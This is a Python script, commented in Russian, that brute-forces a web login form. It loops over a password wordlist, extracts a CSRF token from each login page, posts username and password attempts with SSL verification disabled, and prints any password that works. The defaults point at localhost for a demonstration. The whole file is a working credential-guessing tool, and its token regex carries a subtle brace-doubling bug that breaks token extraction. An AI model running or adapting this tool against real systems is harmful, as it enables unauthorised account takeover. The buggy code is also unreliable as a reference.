import os
import re
import requests
import urllib3

# Отключаем предупреждения SSL для работы под VPN
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def extract_csrf_token(html_text):
    """Ищет CSRF-токен в HTML-коде страницы с помощью регулярки."""
    # Ищет паттерны вида: name="user_token" value="..."
    # или value="..." name="csrf"
    # Токены часто содержат буквы, цифры, подчеркивания и дефисы, длина может варьироваться.
    token_re = r"([A-Za-z0-9_\-]{{6,128}})"
    patterns = [
        rf'name=["\'](?:user_token|csrf_token|csrf|token)["\']\s+value=["\']{token_re}["\']',
        rf'value=["\']{token_re}["\']\s+name=["\'](?:user_token|csrf_token|csrf|token)["\']',
    ]

    for pattern in patterns:
        match = re.search(pattern, html_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def brute_force(target_url, username, wordlist_path):
    if not os.path.exists(wordlist_path):
        print(f"[-] Ошибка: Файл словаря '{wordlist_path}' не найден.")
        return

    print(f"[*] Начало брутфорса формы: {target_url}")
    print(f"[*] Таргет-юзер: {username}")

    # Создаем объект сессии, чтобы сохранять Cookies между запросами
    session = requests.Session()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": target_url,
    }

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for password in f:
            password = password.strip()
            if not password:
                continue

            try:
                # Шаг 1: Загружаем страницу логина, чтобы получить СВЕЖИЙ токен
                login_page = session.get(
                    target_url, headers=headers, timeout=5, verify=False
                )
                csrf_token = extract_csrf_token(login_page.text)

                # Шаг 2: Формируем данные для отправки (Payload)
                # Структура полей зависит от конкретного сайта, это классический пример
                payload = {
                    "username": username,
                    "password": password,
                    "Login": "Login",  # Часто нужна отправка имени самой кнопки
                }

                if csrf_token:
                    # Если токен найден — подмешиваем его в POST-запрос
                    payload["user_token"] = csrf_token

                # Шаг 3: Отправляем попытку входа
                response = session.post(
                    target_url,
                    data=payload,
                    headers=headers,
                    timeout=5,
                    verify=False,
                )

                # Шаг 4: Анализируем ответ
                # Если в ответе НЕТ слов об ошибке, или изменился URL (произошел редирект в админку)
                if (
                    "failed" not in response.text.lower()
                    and "incorrect" not in response.text.lower()
                    and response.status_code in [200, 302]
                ):
                    print(
                        "\n"
                        + "═" * 45
                        + f"\n[+] ПАРОЛЬ НАЙДЕН: {username}:{password}\n"
                        + "═" * 45
                    )
                    return True
                else:
                    print(
                        f"[-] Попытка неудачна: {password} (Token: {csrf_token})"
                    )

            except Exception as e:
                print(f"[!] Ошибка соединения на пароле {password}: {e}")

    print("\n[-] К сожалению, пароль не подобран. Расширьте словарь.")
    return False


if __name__ == "__main__":
    # Учебные параметры для демонстрации
    # В реальных условиях тут будет URL админки проверяемого сайта
    # По умолчанию используем корректный localhost адрес для тестов
    URL = "http://127.0.0.1"

    # Создадим временный мини-словарь для теста прямо кодом, если его нет
    if not os.path.exists("passwords.txt"):
        with open("passwords.txt", "w") as wp:
            wp.write("123456\npassword\nqwerty\nadmin\npassword123\n")

    brute_force(target_url=URL, username="admin", wordlist_path="passwords.txt")
